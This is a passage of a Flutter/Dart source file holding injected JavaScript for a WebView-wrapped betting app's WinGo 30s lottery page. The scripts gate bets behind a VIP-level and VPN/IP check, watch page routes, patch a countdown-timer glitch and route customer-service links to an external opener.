        if (window.__betRestrictionScriptInjected) return;
        window.__betRestrictionScriptInjected = true;

        function showWingoToast(message) {
          var existing = document.getElementById("__wingoToast");
          if (existing) existing.remove();

          var toast = document.createElement("div");
          toast.id = "__wingoToast";
          toast.className = "van-popup van-popup--center van-toast van-toast--middle van-toast--break-word van-toast--text";
          toast.style.cssText = [
            "position: fixed",
            "top: 50%",
            "left: 50%",
            "transform: translate(-50%, -50%)",
            "background-color: rgba(0, 0, 0, 0.7)",
            "color: #FFFFFF",
            "padding: 8px 12px",
            "border-radius: 8px",
            "font-size: 14px",
            "font-weight: 400",
            "font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Helvetica, 'Segoe UI', Arial, Roboto, 'PingFang SC', miui, 'Hiragino Sans GB', 'Microsoft Yahei', sans-serif",
            "line-height: 20px",
            "text-align: center",
            "border: none",
            "box-shadow: none",
            "z-index: 999999",
            "pointer-events: none",
            "max-width: 400px",
            "min-width: 96px",
            "width: fit-content",
            "overflow-wrap: break-word",
            "word-break: break-word",
            "transition: opacity 0.2s ease",
            "opacity: 0"
          ].join(";");

          var textDiv = document.createElement("div");
          textDiv.className = "van-toast__text";
          textDiv.innerText = message;
          toast.appendChild(textDiv);

          document.body.appendChild(toast);

          requestAnimationFrame(function() {
            toast.style.opacity = "1";
          });

          setTimeout(function() {
            toast.style.opacity = "0";
            setTimeout(function() {
              if (toast.parentElement) toast.parentElement.removeChild(toast);
            }, 200);
          }, 2800);
        }

        document.addEventListener("click", function(e) {
          if (window.__maintenanceMode === true) return;
          if (window.__vpnGateOpen === true) return;

          var target = e.target;
          if (!target) return;

          var container = target.closest ? target.closest(".lottery-container") : null;
          if (!container) return;

          var containerHeader = container.querySelector(".header") || container;
          var headerText = (containerHeader.innerText || "").toLowerCase();
          var isWinGo30s = headerText.indexOf("30s") !== -1 || headerText.indexOf("30sec") !== -1;
          if (!isWinGo30s) return;

          var isBetSubmit = false;

          if (target.closest) {
            if (target.closest(".bet-amount") || target.closest(".footer .van-button:not(.cancel)")) {
              isBetSubmit = true;
            }
          }

          if (!isBetSubmit && target.innerText) {
            var txt = target.innerText.trim();
            if (txt.indexOf("Total amount") !== -1 || txt.indexOf("Rs") !== -1) {
              isBetSubmit = true;
            }
          }

          if (isBetSubmit) {
            e.preventDefault();
            e.stopPropagation();
            if (e.stopImmediatePropagation) e.stopImmediatePropagation();

            if (window.__vpnCheckInProgress === true) return;

            var reqVip = (typeof window.__requiredGameVipLevel !== "undefined") ? window.__requiredGameVipLevel : 3;
            var currentVip = (typeof window.__gameVipLevel !== "undefined") ? window.__gameVipLevel : 0;

            if (!currentVip) {
              try {
                var keys = ["userInfo", "user", "userData", "currentUser", "vipInfo", "vipUser", "account", "loginInfo"];
                for (var k = 0; k < keys.length; k++) {
                  var raw = localStorage.getItem(keys[k]) || sessionStorage.getItem(keys[k]);
                  if (raw) {
                    var p = typeof raw === "string" ? JSON.parse(raw) : raw;
                    var obj = (p && p.data) ? p.data : p;
                    if (obj && typeof obj.vipLevel !== "undefined") {
                      currentVip = parseInt(obj.vipLevel, 10);
                      window.__gameVipLevel = currentVip;
                      break;
                    }
                  }
                }
              } catch(err) {}
            }

            if (reqVip > 0 && currentVip < reqVip) {
              showWingoToast("VIP " + (currentVip || 0) + " . Min VIP " + reqVip + " required to place bet.");
              return;
            }

            window.__vpnCheckInProgress = true;
            var pendingBetTarget = target;

            window.__vpnBetAllowed = function() {
              window.__vpnCheckInProgress = false;
              window.__vpnBetAllowed = null;
              window.__vpnBetBlocked = null;
              if (pendingBetTarget) {
                try {
                  window.__vpnGateOpen = true;
                  var evt = new MouseEvent("click", {
                    bubbles: true,
                    cancelable: true,
                    view: window
                  });
                  pendingBetTarget.dispatchEvent(evt);
                } catch(err) {
                  try { pendingBetTarget.click(); } catch(_) {}
                } finally {
                  window.__vpnGateOpen = false;
                }
              }
              pendingBetTarget = null;
            };

            window.__vpnBetBlocked = function() {
              window.__vpnCheckInProgress = false;
              window.__vpnBetAllowed = null;
              window.__vpnBetBlocked = null;
              pendingBetTarget = null;
              showWingoToast("IP not authorized");
            };

            if (window.flutter_inappwebview) {
              window.flutter_inappwebview.callHandler("checkVpnAndBet");
            } else {
              window.__vpnCheckInProgress = false;
              pendingBetTarget = null;
              showWingoToast("IP not authorized");
            }
          }
        }, true);
      })();
    ''';
  }

  /// Injects route watcher to detect when user navigates away from WinGo lottery screen.
  static String routeWatcherScript() {
    return '''
      (function() {
        if (window.__routeWatcherInjected) return;
        window.__routeWatcherInjected = true;

        var failedChecks = 0;
        var isDeactivatedNotified = false;

        function checkRoute() {
          var hash = (window.location.hash || "").toLowerCase();
          var href = (window.location.href || "").toLowerCase();

          var isWinGoPage = hash.indexOf("wingo") !== -1 || href.indexOf("wingo") !== -1;
          var hasWinGoBoard = !!(document.querySelector(".Betting__C") || document.querySelector(".lottery-container"));

          if (!isWinGoPage && !hasWinGoBoard) {
            failedChecks++;
            if (failedChecks >= 3 && !isDeactivatedNotified) {
              isDeactivatedNotified = true;
              if (window.flutter_inappwebview) {
                window.flutter_inappwebview.callHandler("deactivateWinGo30Sec");
              }
            }
          } else {
            failedChecks = 0;
            isDeactivatedNotified = false;
          }
        }

        window.addEventListener("hashchange", checkRoute);
        window.addEventListener("popstate", checkRoute);
        setInterval(checkRoute, 2000);
      })();
    ''';
  }

  /// Injects MutationObserver to replace `-1:-1` glitch with `0` in countdown timer.
  static String timerSanitizerScript() {
    return '''
      (function() {
        if (window.__timerSanitizerInjected) return;
        window.__timerSanitizerInjected = true;

        function sanitizeTimer() {
          var container = document.querySelector(".TimeLeft__C-time") || document.querySelector(".time");
          if (!container) return;

          var text = container.innerText || "";
          if (text.indexOf("-") !== -1) {
            var divs = container.querySelectorAll("div");
            for (var i = 0; i < divs.length; i++) {
              if (divs[i].innerText && divs[i].innerText.trim() === "-") {
                divs[i].innerText = "0";
              }
            }
          }
        }

        var observer = new MutationObserver(sanitizeTimer);
        var target = document.querySelector(".TimeLeft__C-time") || document.body;
        if (target) {
          observer.observe(target, { childList: true, subtree: true, characterData: true });
        }
      })();
    ''';
  }

  /// Injects helper to hook window.open and customer service anchor clicks.
  static String customerServiceHelperScript() {
    return '''
      (function() {
        if (window.__customerServiceHelperInjected) return;
        window.__customerServiceHelperInjected = true;

        var origWindowOpen = window.open;
        window.open = function(url, target, features) {
          if (url && typeof url === "string" && url.trim() !== "" && url !== "about:blank") {
            if (window.flutter_inappwebview) {
              window.flutter_inappwebview.callHandler("openExternalUrl", url);
            }
            return {
              closed: false,
              focus: function() {},
              close: function() { this.closed = true; },
              location: {
                set href(val) {
                  if (val && typeof val === "string" && val !== "about:blank") {
                    if (window.flutter_inappwebview) {
                      window.flutter_inappwebview.callHandler("openExternalUrl", val);
                    }
                  }
                },
                get href() { return url || ""; }
              }
            };
          }

          var proxyWin = {
            closed: false,
            focus: function() {},
            close: function() { this.closed = true; },
            _href: "",
            location: {}
          };

          Object.defineProperty(proxyWin.location, "href", {
            set: function(val) {
              proxyWin._href = val;
              if (val && typeof val === "string" && val !== "about:blank") {
                if (window.flutter_inappwebview) {
                  window.flutter_inappwebview.callHandler("openExternalUrl", val);
                }
              }
            },
            get: function() {
              return proxyWin._href;
            }
          });

          return proxyWin;
        };

        document.addEventListener("click", function(e) {
          var target = e.target;
          if (!target) return;

          var item = target.closest ? target.closest(".serviceCenter__container-items__item, [class*='customer'], [class*='service'], [class*='serverTicket']") : null;
          if (!item) return;

          var anchor = item.closest("a") || item.querySelector("a");
          if (anchor && anchor.href && anchor.href.indexOf("http") === 0) {
            e.preventDefault();
            e.stopPropagation();
            if (window.flutter_inappwebview) {
              window.flutter_inappwebview.callHandler("openExternalUrl", anchor.href);
            }
          }
        }, true);
      })();
    ''';
  }
}
